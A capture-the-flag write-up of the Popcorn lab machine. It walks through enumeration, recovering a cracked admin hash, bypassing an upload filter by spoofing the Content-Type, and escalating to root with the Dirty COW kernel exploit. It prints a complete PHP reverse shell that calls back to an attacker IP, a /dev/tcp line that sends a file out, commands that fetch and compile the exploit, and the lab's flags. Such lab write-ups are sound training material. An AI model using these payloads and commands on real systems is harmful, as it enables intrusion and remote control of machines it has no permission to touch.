# CTF Writeup: Popcorn

## Lab Description

Popcorn, while not overly complicated, contains quite a bit of content and it can be difficult for some users to locate the proper attack vector at first. This machine mainly focuses on different methods of web exploitation. 

---

## Reconaissance


An initial scan revealed the following information about the services running on the target system.

```
nmap -A -p- --min-rate 10000 10.129.47.37 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 14:57 EDT
Nmap scan report for 10.129.47.37
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Did not follow redirect to http://popcorn.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/26%OT=22%CT=1%CU=32651%PV=Y%DS=2%DC=T%G=Y%TM=68FE6F
OS:3A%P=x86_64-pc-linux-gnu)SEQ(SP=C7%GCD=2%ISR=CD%TI=Z%CI=Z%II=I%TS=8)SEQ(
OS:SP=CA%GCD=1%ISR=CA%TI=Z%CI=Z%II=I%TS=8)SEQ(SP=CD%GCD=1%ISR=CC%TI=Z%CI=Z%
OS:II=I%TS=8)SEQ(SP=CD%GCD=1%ISR=D0%TI=Z%CI=Z%II=I%TS=8)SEQ(SP=CE%GCD=1%ISR
OS:=D1%TI=Z%CI=Z%II=I%TS=8)OPS(O1=M552ST11NW6%O2=M552ST11NW6%O3=M552NNT11NW
OS:6%O4=M552ST11NW6%O5=M552ST11NW6%O6=M552ST11)WIN(W1=16A0%W2=16A0%W3=16A0%
OS:W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M552NNSNW6%CC=Y%Q=)T1
OS:(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164
OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: popcorn.hackthebox.gr; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   38.79 ms 10.10.14.1
2   38.80 ms 10.129.47.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.96 seconds
```

The http service wanted to forward us to the domain popcorn.htb, but failed. Let's map this domain to the target ip in our local dns file /etc/hosts

The webpage is almost empty, but tells us that "It works! This is the default webpage for this server. The Web Server software is running but no content has been added,yet."
Sounds interesting let's enumerate endpoints & subdomains on the domain!

Enumerated 2 interesting endpoints, 1 is called /torrent which prompts us to an old torrent webpage, with an login page asw and /rename endpoint which prompts us with an api syntax.

```
Renamer API Syntax: index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name
```

Let's try and explore the /torrent page first.

Enumerated endpoints on /torrent


```
gobuster dir -u http://popcorn.htb/torrent/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://popcorn.htb/torrent/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/images/]
/index                (Status: 200) [Size: 11406]
/download             (Status: 200) [Size: 0]
/rss                  (Status: 200) [Size: 968]
/login                (Status: 200) [Size: 8412]
/templates            (Status: 301) [Size: 322] [--> http://popcorn.htb/torrent/templates/]
/users                (Status: 301) [Size: 318] [--> http://popcorn.htb/torrent/users/]
/admin                (Status: 301) [Size: 318] [--> http://popcorn.htb/torrent/admin/]
/health               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/health/]
/browse               (Status: 200) [Size: 9320]
/comment              (Status: 200) [Size: 936]
/upload               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/upload/]
/css                  (Status: 301) [Size: 316] [--> http://popcorn.htb/torrent/css/]
/edit                 (Status: 200) [Size: 0]
/lib                  (Status: 301) [Size: 316] [--> http://popcorn.htb/torrent/lib/]
/database             (Status: 301) [Size: 321] [--> http://popcorn.htb/torrent/database/]
/secure               (Status: 200) [Size: 4]
/js                   (Status: 301) [Size: 315] [--> http://popcorn.htb/torrent/js/]
/logout               (Status: 200) [Size: 183]
/preview              (Status: 200) [Size: 28104]
/config               (Status: 200) [Size: 0]
/readme               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/readme/]
/thumbnail            (Status: 200) [Size: 1789]
/torrents             (Status: 301) [Size: 321] [--> http://popcorn.htb/torrent/torrents/]
/validator            (Status: 200) [Size: 0]
/hide                 (Status: 200) [Size: 3765]
/PNG                  (Status: 301) [Size: 316] [--> http://popcorn.htb/torrent/PNG/]
```

Further enumerating the /database endpoint prompts us with an exposed .sql database file, investigating it provides us admin credentials admin:1844156d4166d94387f1a4ad031ca5fa

The password seems to be encoded, let's decode it on crackstation.net

```
admin:admin12
```

The torrent page has an login, registration & upload functioanlity which seem interesting.
Let's register an account saitama:password

Logging into the webpage.

Let's also search up for any vulnerabilities for "Torrent Hoster"

```
searchsploit Torrent Hoster
--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  Path
--------------------------------------------------------------------------------------- ---------------------------------
Torrent Hoster - Remount Upload                                                        | php/webapps/11746.txt
--------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

This exploit seems rather interesting, since it tells us that we can upload an revshell 

So I started by downloading an random torrent file from the internet, I decided to go for the kali linux torrent, let's upload it. When logging in and uploading the torrent file, we are getting forwarded to the page of the kali linux torrent.iso file. In this site, there is an screenshot upload functionality, let's check if we can bypass filters. Since it didn't work with the torrent page.
Selected my php reverse shell and intercepted traffic in burp proxy.
The network package looks as following:

```
POST /torrent/upload_file.php?mode=upload&id=920dcb9268b2e20fbe0f0bd9a4de82188ce28033 HTTP/1.1
Host: popcorn.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary30f498d8769a52908a2ab74ab99c4790
Content-Length: 5834
Origin: http://popcorn.htb
Connection: keep-alive
Referer: http://popcorn.htb/torrent/edit.php?mode=edit&id=920dcb9268b2e20fbe0f0bd9a4de82188ce28033
Cookie: /torrent/=; /torrent/torrents.php=; /torrent/login.php=; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; saveit_0=4; saveit_1=0; PHPSESSID=62e45af9e0da7541eafd94ded1d7e79d
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary30f498d8769a52908a2ab74ab99c4790
Content-Disposition: form-data; name="file"; filename="revshell.php"
Content-Type: application/x-php

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.186';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 




------geckoformboundary30f498d8769a52908a2ab74ab99c4790
Content-Disposition: form-data; name="submit"

Submit Screenshot
------geckoformboundary30f498d8769a52908a2ab74ab99c4790--

```

Let's change the Content-Type parameter from application/x-php to image/png. This could potentially bypass filters and upload our reverse shell --> it worked!

Starting up my listener on port 1337


```
nc -lvnp 1337
```

Navigated to "My Torrents" at the top right & pressed on the red marking "Image File Not Found!" This displayed our script and gained RCE as user "www-data".

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.47.37] 57064
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 23:02:02 up  2:07,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ whoami
www-data
```

Retrieved user.txt in /home/george directory.

```
11472063af92bae32e76453a6f6e3ac5
```

In the home directory is an interesting .zip file. Let's download it onto our local machine & unzip it!

On target server

```
cat torrenthoster.zip < /dev/tcp/10.10.14.186/8888 
```

On local machine


```
nc -lvnp 8888 > torrenthoster.zip
```

unfortunately the .zip file get's broken.


```
file torrenthoster.zip 
torrenthoster.zip: empty
```

Enumerated users on the target.

```
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
george:x:1000:1000:George Papagiannopoulos,,,:/home/george:/bin/bash
```


Let's check up the linux kernel version.

```
uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
```


This version of the kernel is vulnerable to an strong public exploit, called dirtycow, let's exploit it!

Therefore I will utilize following PoC:

```
git clone https://github.com/firefart/dirtycow.git
```

started up my python server on my local machine

```
python3 -m http.server 80
```

Navigated into /tmp directory and requested the malicious script

```
wget http://10.10.14.186/dirty.c
```

since gcc is on the box, we can compile it using the PoC from the github repo.

```
gcc -pthread dirty.c -o dirty -lcrypt
```

Give the binary executable rights.


```
chmod +x dirty
```

Ran the executable and prompted new password.


```
./dirty 
password
```

After sometime the "toor" user got created with root rights.

Logging into the user provided us with root shell.

```
www-data@popcorn:/$ su toor
su toor
Password: password

toor@popcorn:/#
```

Retrieved root.txt in /root directory.

```
389845ebdb0b3c1e2461a6b38699f997
```
